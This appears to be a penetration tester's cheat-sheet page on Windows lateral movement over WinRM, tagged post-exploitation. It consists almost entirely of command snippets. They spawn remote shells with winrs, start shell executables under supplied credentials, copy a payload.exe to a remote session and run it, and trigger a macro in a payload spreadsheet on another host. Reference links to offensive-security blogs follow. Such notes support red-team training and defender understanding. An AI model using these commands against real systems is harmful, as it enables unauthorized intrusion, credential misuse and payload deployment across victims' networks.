---
author(s):
  - Userware
tags:
  - post-exploitation
  - lateral-movement
  - living-off-the-land
  - T1021-006
  - network-protocols
  - winrm
  - windows
---
# Living off the Land

## 01 - Command Prompt

Using `winrs.exe` to laterally spawn shells via WinRM

```
C:\> winrs -remote:<IP> <commands>

C:\> winrs -r:http://<IP>/wsman <commands>

C:\> winrs -r:<IP> -ad -u:<username> -p:<password> <commands>
```

## 02 - PowerShell

### 2.1 - Start-Process

```powershell
PS C:\> $username = '<username>'
$password = '<password>'
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword

Start-Process -FilePath C:\path\to\shell.exe -NoNewWindow -Credential $credential -WorkingDirectory c:\users\public
```

You can pass arguments as well when using `netcat` for example

```
PS C:\> Start-Process -FilePath <C:\path\to\program.exe> -NoNewWindow -Credential $credential -ArgumentList ("<arg1>","<arg2>","<arg3>") -WorkingDirectory C:\Users\Public
```

### 2.2 - Authenticate Remotely

```powershell
PS C:\> $password = ConvertTo-SecureString "<password>" -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential("<username>", $password)
$computer = "<IP>"
[System.Diagnostics.Process]::Start("<Commands>", $credential.Username, $credential.Password, $computer)
```

```powershell
PS C:\> $ip = New-PSSession -ComputerName <IP>

Copy-Item payload.exe -Destination "c:\users\public\" -ToSession $ip

Invoke-Command -Session $ip -ScriptBlock {c:\users\public\payload.exe}
```

### 2.3 - Macros

#### 2.3.1 - `Excel.Application`

```
PS C:\> Invoke-Command -ComputerName <IP> -Credential $credential -ScriptBlock {
	$excel = New-Object -ComObject Excel.Application
	$workbook = $excel.Workbooks.Open("C:\path\to\payload.xls")
	$excel.Run("mymacro")
	$workbook.Close($false)
	$excel.Quit()
}
```

---
## References

### Backlink

- [[06 - Tactics & Techniques & Procedures (TTPs) Phases/F - Post Exploitation/0x07 - Lateral Movement/Windows/02 - RPC/04 - DCOM/Manual/Living off the Land]]

### Github

- [HarmJ0y: PsRemoting.ps1](https://gist.github.com/HarmJ0y/4c37e43ba4865bdef2a8)

### SS64

- [SS64: WinRS](https://ss64.com/nt/winrs.html)

### Microsoft

- [Powershell Module New-CimSession](https://docs.microsoft.com/en-us/powershell/module/cimcmdlets/new-cimsession?view=powershell-7.2)

- [Powershell Module Get-CimSession](https://docs.microsoft.com/en-us/powershell/module/cimcmdlets/get-cimsession?view=powershell-7.2)

### LOFLCAB

- [LOFLCAB: Enter-PSSession](https://lofl-project.github.io/loflcab/Cmdlets/Enter-PSSession/)

### evilcomrade

- [evilcomrade: Windows Lateral Movement Fu](https://1evilcomrade.blogspot.com/2017/11/windows-lateral-movement-fu.html)

### Slayer Labs

- [Slayer Labs: Kerberos Double-Hop Workarounds](https://posts.slayerlabs.com/double-hop/)

### Hacking Articles

- [Hacking Articles: Remote Services (Mitre:T1021)](https://www.hackingarticles.in/lateral-movement-remote-services-mitret1021/)

### Pentestlab

- [Pentestlab Blog: Powershell Remoting](https://pentestlab.blog/tag/powershell-remoting/)